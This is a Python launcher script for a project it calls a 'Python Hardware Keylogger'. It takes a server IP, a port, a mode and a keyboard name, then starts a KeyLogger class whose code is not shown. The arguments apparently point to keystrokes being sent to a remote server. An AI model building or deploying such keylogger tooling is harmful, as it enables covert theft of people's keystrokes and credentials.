import logging
import argparse

from src.Setup import Setup
from src.KeyLogger import KeyLogger


def main(args) -> None:
    setup: Setup = Setup(args)
    keylogger: KeyLogger = setup.get_keylogger()
    keylogger.run()


if __name__ == "__main__":
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="Python Hardware Keylogger"
    )
    parser.add_argument(
        "-m", "--mode", type=str, help="This Logger level d=debug, p=production"
    )
    parser.add_argument("-i", "--ip", type=str, help="The server IP Addr.")
    parser.add_argument("-p", "--port", type=str, help="The server port")
    parser.add_argument(
        "-k",
        "--keyboard",
        type=str,
        help="keyboard_name currently supported: mini_keyboard",
    )
    args = parser.parse_args()
    main(args)
